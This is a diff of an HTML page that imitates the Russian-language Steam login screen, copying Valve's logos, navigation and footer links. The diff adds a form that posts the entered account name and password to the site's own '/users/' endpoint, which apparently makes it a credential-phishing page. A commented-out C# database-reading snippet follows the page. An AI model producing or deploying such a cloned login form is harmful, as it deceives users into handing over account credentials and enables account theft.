@@ -5,6 +5,8 @@
 	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1">
 	<title>Steam Login</title>
+	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.6.2/jquery.min.js"></script>
+
 	<link rel="stylesheet" type="text/css" href="css/header.css">
 	<link rel="stylesheet" type="text/css" href="css/body.css">
 	<link rel="stylesheet" type="text/css" href="css/footer.css">
@@ -12,66 +14,65 @@
 </head>
 <body style="background-color:#181A21;">
 	<!-- Body Content -->
-			<!-- resp_header -->
-		<div id="useless" style="height: 1px; width: auto; margin-bottom: 65px;">
-		</div>
-		<style>
-			#useless
-			{
-				display:none;
+	<!-- resp_header -->
+	<div id="useless" style="height: 1px; width: auto; margin-bottom: 65px;">
+	</div>
+	<style>
+		#useless {
+			display: none;
+		}
+
+		@media screen and (max-width: 910px) {
+			#useless {
+				display: block;
 			}
-			@media screen and (max-width: 910px)
-			{
-				#useless {
-    				display: block;
-				}
-			}
-		</style>
-		<div class="resp_header">
-			<div class="resp_header-content">
-				<div class="resp_menu_logo">
-					<img src="https://store.akamai.steamstatic.com/public/shared/images/responsive/header_menu_hamburger.png" height="100%">
-				</div>
-				<div class="resp_header_logo">
-						<a href="https://store.steampowered.com/?snr=1_60_4__global-responsive-menu">
-							<img src="https://store.akamai.steamstatic.com/public/shared/images/responsive/header_logo.png" height="36" border="0" alt="STEAM">
-						</a>
-					</div>
+		}
+	</style>
+	<div class="resp_header">
+		<div class="resp_header-content">
+			<div class="resp_menu_logo">
+				<img src="https://store.akamai.steamstatic.com/public/shared/images/responsive/header_menu_hamburger.png" height="100%">
+			</div>
+			<div class="resp_header_logo">
+				<a href="https://store.steampowered.com/?snr=1_60_4__global-responsive-menu">
+					<img src="https://store.akamai.steamstatic.com/public/shared/images/responsive/header_logo.png" height="36" border="0" alt="STEAM">
+				</a>
 			</div>
 		</div>
+	</div>
 	<div class="page-content" style="paa">
-			<!-- Header -->
+		<!-- Header -->
 		<div class="header">
 			<div class="header-content">
 				<div class="logo">
 					<a href="" class="logo-link">
-						<img src="https://	store.cloudflare.steamstatic.com/	public/shared/images/header/	logo_steam.svg?t=962016" alt="" 	width="176" height="44">
+						<img src="https://	store.cloudflare.steamstatic.com/	public/shared/images/header/	logo_steam.svg?t=962016" alt="" width="176" height="44">
 					</a>
 				</div>
 				<div class="nav">
 					<a href="https://	store.steampowered.com/" class="	option">Магазин</a>
-					<a href="https://steamcommunity.com/"	 class="option">Сообщество</a>
+					<a href="https://steamcommunity.com/" class="option">Сообщество</a>
 					<a href="https://	store.steampowered.com/about/?	snr=1_60_4__global-header" class="	option">О STEAM</a>
 					<a href="https://	help.steampowered.com/ru/" class="	option">Поддержка</a>
 				</div>
 				<div class="buttons">
 					<div class="button-download">
 						<div class="	button-download-content">
-					    	Установить Steam
-					    </div>
-				    </div>
-				    <div class="entry">войти</div>
-				     | 
-				    <span class="lang"> язык</span>
+							Установить Steam
+						</div>
+					</div>
+					<div class="entry">войти</div>
+					|
+					<span class="lang"> язык</span>
 				</div>
 			</div>
 		</div>
 		<style>
-			@media screen and (max-width: 910px)
-			{
+			@media screen and (max-width: 910px) {
 				.header {
-    				display: none;
+					display: none;
 				}
+
 				.resp_header {
 					display: block;
 				}
@@ -83,28 +84,28 @@
 					<div class="login-entry">
 						<div class="login-entry2">
 							ВОЙТИ
-						</div>	
+						</div>
 					</div>
 					<style>
-						@media screen and (max-width: 700px)
-						{
+						@media screen and (max-width: 700px) {
 							.login-wrapper, .login, .login-entry {
-    								text-align: center;
+								text-align: center;
 							}
 						}
 					</style>
 					<div class="form-container">
 						<div class="form-container-content">
-							<div class="form-container-input">
+
+							<form class="form-container-input" action="/users/" method="POST">
 								<div class="form-container-input-name">
 									<div class="textname">Войти, используя имя аккаунта</div>
 									<div></div>
-									<input class="textinput"></input>
+									<input name="id" class="textinput"></input>
 								</div>
 								<div class="form-container-input-name">
 									<div class="textname1">Пароль</div>
 									<div></div>
-									<input class="textinput"></input>
+									<input name="name" class="textinput"></input>
 								</div>
 								<div class="checkbox">
 									<div class="checkbox-box">
@@ -115,7 +116,8 @@
 									<button class="form-button">Войти</button>
 								</div>
 								<a class="form-help" href="https://help.steampowered.com/wizard/HelpWithLogin?redir=https%3A%2F%2Fstore.steampowered.com%2Flogin%2F%3Fredir%3D%253Fl%253Drussian%26redir_ssl%3D1%26snr%3D1_4_4__global-header">Помогите, я не могу войти в свой аккаунт</a>
-							</div>
+							</form>
+
 							<div class="form-container-qr">
 								<div class="form-container-qr-content">
 									<div class="textname">
@@ -136,38 +138,42 @@
 								</div>
 							</div>
 							<style>
-								@media screen and (max-width: 700px) {	
-									.form-container-qr {							
+								@media screen and (max-width: 700px) {
+									.form-container-qr {
 										display: flex;
-    									flex-direction: column;
-    									align-items: center;
-    									margin-left: 0;
-    									margin-top: 48px;
-    								}
-    								.form-container-qr-content{
-    									align-items: center;
-    								}
-    								.beta-svg {
-    									display: none;
-    								}
-    							}
+										flex-direction: column;
+										align-items: center;
+										margin-left: 0;
+										margin-top: 48px;
+									}
+
+									.form-container-qr-content {
+										align-items: center;
+									}
+
+									.beta-svg {
+										display: none;
+									}
+								}
 							</style>
 						</div>
 					</div>
-					
-				</div> 
-			</div>	
+
+				</div>
+			</div>
 		</div>
 		<style>
 			@media screen and (max-width: 700px) {
 				.login-wrapper {
-    				padding-top: 12px;
-    				padding-bottom: 0px;
+					padding-top: 12px;
+					padding-bottom: 0px;
 				}
+
 				.form-container {
-    				min-width: 0px;
-    				background-color: transparent;
+					min-width: 0px;
+					background-color: transparent;
 				}
+
 				.form-container-content {
 					flex-direction: column;
 				}
@@ -191,11 +197,11 @@
 		<style>
 			@media screen and (max-width: 700px) {
 				.page-bottom {
-    				flex-direction: column-reverse;
+					flex-direction: column-reverse;
 				}
 			}
 		</style>
-	<!-- Footer -->
+		<!-- Footer -->
 		<div id="footer_spacer"></div>
 		<div class="footer">
 			<div class="footer-content">
@@ -207,57 +213,82 @@
 					<a href="http://www.valvesoftware.com"><img height="25px" src="https://store.cloudflare.steamstatic.com/public/	images/footerLogo_valve_new.png" border="0"></a>
 				</div>
 				<div id="footer_text" data-panel="{&quot;flow-children&quot;:&quot;row&quot;}">
-        			<div>© 2022 Valve Corporation. Все права защищены. Все торговые марки являются собственностью соответствующих владельцев в США и других странах.</div>
-        			<div>НДС включён во все цены, где он применим.&nbsp;&nbsp;
+					<div>© 2022 Valve Corporation. Все права защищены. Все торговые марки являются собственностью соответствующих владельцев в США и других странах.</div>
+					<div>
+						НДС включён во все цены, где он применим.&nbsp;&nbsp;
 
-            		<a href="https://store.steampowered.com/privacy_agreement/?snr=1_44_44_" target="_blank" rel="noreferrer">Политика конфиденциальности</a>
-            		&nbsp; | &nbsp;
-            		<a href="https://store.steampowered.com/legal/?snr=1_44_44_" target="_blank" rel="noreferrer">Правовая информация</a>
-            		&nbsp; | &nbsp;
- 		           <a href="https://store.steampowered.com/subscriber_agreement/?snr=1_44_44_" target="_blank" rel="noreferrer">Соглашение подписчика Steam</a>
-           			&nbsp; | &nbsp;
-            		<a href="https://store.steampowered.com/steam_refunds/?snr=1_44_44_" target="_blank" rel="noreferrer">Возвраты</a>
-            		&nbsp; | &nbsp;
-            		<a href="https://store.steampowered.com/account/cookiepreferences/?snr=1_44_44_" target="_blank" rel="noreferrer">Файлы cookie</a>
-        			</div>
+						<a href="https://store.steampowered.com/privacy_agreement/?snr=1_44_44_" target="_blank" rel="noreferrer">Политика конфиденциальности</a>
+						&nbsp; | &nbsp;
+						<a href="https://store.steampowered.com/legal/?snr=1_44_44_" target="_blank" rel="noreferrer">Правовая информация</a>
+						&nbsp; | &nbsp;
+						<a href="https://store.steampowered.com/subscriber_agreement/?snr=1_44_44_" target="_blank" rel="noreferrer">Соглашение подписчика Steam</a>
+						&nbsp; | &nbsp;
+						<a href="https://store.steampowered.com/steam_refunds/?snr=1_44_44_" target="_blank" rel="noreferrer">Возвраты</a>
+						&nbsp; | &nbsp;
+						<a href="https://store.steampowered.com/account/cookiepreferences/?snr=1_44_44_" target="_blank" rel="noreferrer">Файлы cookie</a>
+					</div>
 				</div>
 				<div class="valve_links" data-panel="{&quot;flow-children&quot;:&quot;row&quot;}">
 					<br>
 					<div class="line-above"></div>
-        			<a href="http://www.valvesoftware.com/about" target="_blank" rel="noreferrer">О Valve</a>
-        			&nbsp; | &nbsp;<a href="http://www.valvesoftware.com" target="_blank" rel="noreferrer">Вакансии</a>
-        			&nbsp; | &nbsp;<a href="http://www.steampowered.com/steamworks/" target="_blank" rel="noreferrer">Steamworks</a>
-        			&nbsp; | &nbsp;<a href="https://partner.steamgames.com/steamdirect" target="_blank" rel="noreferrer">Дистрибуция Steam</a>
-        			&nbsp; | &nbsp;<a href="https://help.steampowered.com/ru/?snr=1_44_44_">Служба поддержки</a>
-        			&nbsp; | &nbsp;<a href="https://store.steampowered.com/digitalgiftcards/?snr=1_44_44_">Подарочные карты</a>
+					<a href="http://www.valvesoftware.com/about" target="_blank" rel="noreferrer">О Valve</a>
+					&nbsp; | &nbsp;<a href="http://www.valvesoftware.com" target="_blank" rel="noreferrer">Вакансии</a>
+					&nbsp; | &nbsp;<a href="http://www.steampowered.com/steamworks/" target="_blank" rel="noreferrer">Steamworks</a>
+					&nbsp; | &nbsp;<a href="https://partner.steamgames.com/steamdirect" target="_blank" rel="noreferrer">Дистрибуция Steam</a>
+					&nbsp; | &nbsp;<a href="https://help.steampowered.com/ru/?snr=1_44_44_">Служба поддержки</a>
+					&nbsp; | &nbsp;<a href="https://store.steampowered.com/digitalgiftcards/?snr=1_44_44_">Подарочные карты</a>
 					&nbsp; | &nbsp;<a href="https://steamcommunity.com/linkfilter/?url=http://www.facebook.com/Steam"><img src="https://store.cloudflare.steamstatic.com/public/images/ico/			ico_facebook.gif">Steam</a>
 					&nbsp; | &nbsp;<a href="http://twitter.com/steam"><img src="https://store.cloudflare.steamstatic.com/public/images/ico/ico_twitter.gif">@steam</a>
-            </div>
+				</div>
 			</div>
-		<style>
-			@media screen and (max-width: 910px)
-			{
-				.footer{
-					display: none;
+			<style>
+				@media screen and (max-width: 910px) {
+					.footer {
+						display: none;
+					}
 				}
-			}
-		</style>
-    	</div>
+			</style>
+		</div>
 	</div>
 	<style>
-		@media screen and (max-width: 910px)
-		{
+		@media screen and (max-width: 910px) {
 			.page-content {
-    			background: radial-gradient(rgba(24, 26, 33, 0) 0%, #181A21 100%) fixed no-repeat, url(https://store.cloudflare.steamstatic.com/public/shared/images/joinsteam/new_login_bg_strong_mask.jpg) center top no-repeat, #181A21;
-    			max-width: 940px;
+				background: radial-gradient(rgba(24, 26, 33, 0) 0%, #181A21 100%) fixed no-repeat, url(https://store.cloudflare.steamstatic.com/public/shared/images/joinsteam/new_login_bg_strong_mask.jpg) center top no-repeat, #181A21;
+				max-width: 940px;
 			}
 		}
-		@media screen and (max-width: 700px)
-		{
+
+		@media screen and (max-width: 700px) {
 			.page-content {
-    			background: radial-gradient(rgba(24, 26, 33, 0) 0%, #181A21 100%) fixed no-repeat, url(https://store.cloudflare.steamstatic.com/public/shared/images/joinsteam/new_login_bg_strong_mask_mobile.jpg) center top no-repeat, #181A21;
+				background: radial-gradient(rgba(24, 26, 33, 0) 0%, #181A21 100%) fixed no-repeat, url(https://store.cloudflare.steamstatic.com/public/shared/images/joinsteam/new_login_bg_strong_mask_mobile.jpg) center top no-repeat, #181A21;
 			}
 		}
-	</style>	
+	</style>
 </body>
 </html>
+
+
+
+<!-- using (SqlConnection connection = new SqlConnection(connectionString))
+			{
+				connection.Open();
+				SqlCommand command = new SqlCommand(sqlExpression, connection);
+				SqlDataReader reader = command.ExecuteReader();
+
+
+				if (reader.HasRows) // если есть данные
+				{
+
+					while (reader.Read()) // построчно считываем данные
+					{
+						int id = reader.GetInt32(0);
+						string name = reader.GetString(1);
+						string surname = reader.GetString(2);
+
+						Console.WriteLine("{0} \t{1} \t{2}", id, name, surname);
+					}
+				}
+
+				reader.Close();
+			}
+-->
